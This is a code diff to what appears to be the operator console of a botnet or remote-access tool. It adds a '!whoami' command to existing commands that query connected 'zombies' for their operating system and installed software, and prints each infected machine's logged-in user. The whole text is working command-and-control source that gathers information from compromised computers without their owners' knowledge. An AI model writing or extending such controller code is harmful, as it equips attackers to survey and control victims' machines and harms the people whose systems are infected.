@@ -16,7 +16,10 @@ codes_list = {
     '2':'get_os',
     '__comment__get_software':'cid=3, does not have second part (for request)',
     'get_software':'3',
-    '3':'get_software'
+    '3':'get_software',
+    '__comment__get_whoami':'cid=4, does not have second part (for request)',
+    '4':'get_whoami',
+    'get_whoami':'4'
 }
 
 class Terminal:
@@ -43,6 +46,7 @@ Select Target           ---> -h "TARGET"
 !set target TARGET      ---> set default target
 !get-zombies            ---> get connected zombies
 !software               ---> get target installed software
+!whoami                 ---> get logged in user
             '''
             self.push_text_in_terminal_box(text=help_msg)
 
@@ -55,6 +59,8 @@ Select Target           ---> -h "TARGET"
             self.get_os()
         elif self.command.startswith('!software'):
             self.get_software()
+        elif self.command.startswith('!whoami'):
+            self.get_whomai()
         else:
             first_command = self.command.split(' ')
             if len(first_command) >= 1 :
@@ -62,6 +68,23 @@ Select Target           ---> -h "TARGET"
             elif len(first_command) == 0:
                 first_command = self.command
             self.push_text_in_terminal_box(text='Command {} Not Found!'.format(first_command))
+
+    def get_whomai(self):
+        target_list = self.find_target_zombie()
+        if target_list:
+            for target in target_list:
+                communicator = self.get_communicator(target=target)
+                msg = 'cid={},'.format(codes_list['get_whoami'])
+                reply = communicator.msg_manager(msg=msg, has_reply=True)
+                get_cid_pattern = r'cid=(\d*),'
+                cid = re.findall(get_cid_pattern, reply)
+                if len(cid) == 1:
+                    cid = cid[0]
+                    if codes_list[cid] == 'get_whoami':
+                        output = reply.split(',')
+                        if len(output) >= 2:
+                            output = ",".join(output[1:])
+                            self.push_text_in_terminal_box(text=output)
 
     def get_software(self):
         target_list = self.find_target_zombie()
